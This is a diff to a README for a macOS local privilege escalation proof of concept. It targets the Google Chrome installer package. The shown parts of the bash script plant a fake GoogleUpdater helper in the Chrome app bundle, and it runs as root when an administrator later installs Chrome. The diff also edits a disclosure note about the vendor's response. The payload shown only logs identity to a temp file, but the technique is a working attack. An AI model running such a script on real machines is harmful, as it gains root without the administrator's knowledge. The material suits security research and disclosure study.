@@ -1,14 +1,17 @@
 ## macOS User-assisted Local Privilege Escalation when installing Google Chrome
 
 
-1. run the prepare script (`lpe.sh`)
+You can try this for yourself, with this link on webarchive: [googlechrome.pkg](https://web.archive.org/web/20260113235628/https://dl.google.com/chrome/mac/stable/accept_tos%3Dhttps%3A%2F%2Fwww.google.com%2Fintl%2Fen_ph%2Fchrome%2Fterms%2F%26_and_accept_tos%3Dhttps%3A%2F%2Fpolicies.google.com%2Fterms/googlechrome.pkg)
+
+
+1. run the prepare script (`prepare.sh`)
 2. wait till a legitemate administrator installs the Google Chrome via the installer package.
 3. root code executed without the user knowing.
 
 
 ```sh
 #!/bin/bash
-# Google Chrome Local Privilege Escalation via installer package
+# Google Chrome user-assisted Local Privilege Escalation
 # Author: Kun Peeks (@SwayZGl1tZyyy)
 # sunday 1 february 2026 (01-02-2026)
 set -e
@@ -29,7 +32,7 @@ mkdir -p "$APP_PATH/Contents/Frameworks/Google Chrome Framework.framework/Helper
 cat > "$APP_PATH/Contents/Frameworks/Google Chrome Framework.framework/Helpers/GoogleUpdater.app/Contents/MacOS/GoogleUpdater" << 'EOF'
 #!/bin/bash
 {
-    echo "The vicitm has installed Google Chrome via the package installer"
+    echo "The administrator has installed Google Chrome via the package installer"
     echo "Executed as: $(whoami)"
     echo "UID: $(id -u)"
     id
@@ -79,10 +82,10 @@ echo "[!] after install, check: cat /tmp/chrome_pwned.txt"
 ```
 
 
+
+
 #### disclosure
 
-I'm dislosing this because Google/Chromium doesn't see admin->root as a valid local privilege escalation... So now they're fixing this vulnerability as a bug with no security impact. They're calling this now as "spoof" (Lol)
+I'm dislosing this because Google/Chromium doesn't see admin->root as a valid local privilege escalation... So now they're fixing this vulnerability as "spoofing" a bug with no security impact.
 
-A bit unfortunate that I reported this, as this could've been very useful for red teamers.
-
-
+A bit unfortunate that I reported this to Google Chrome, as this could've been useful for red teamers.
